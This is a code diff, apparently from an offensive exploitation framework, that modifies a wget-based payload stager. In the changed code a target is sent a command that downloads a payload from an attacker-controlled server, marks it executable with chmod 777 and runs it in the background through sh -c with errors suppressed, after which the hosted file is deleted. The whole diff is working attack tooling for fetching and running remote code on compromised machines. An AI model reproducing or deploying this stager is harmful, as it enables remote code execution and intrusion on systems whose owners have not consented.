@@ -85,20 +85,15 @@ class Handler(TCP):
         requests.post(wget_server.format(wget_bin, wget_file), data=payload)
         self.badges.output_process("Uploading payload...")
 
-        command = wget_stream.format(wget_server, filename)
-        if encode:
-            sender(*args, (command + '\n').encode())
-        else:
-            sender(*args, command)
-        requests.delete(wget_container)
-
+        command = wget_stream.format(wget_server, path)
         args = args if args is not None else ""
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+        requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
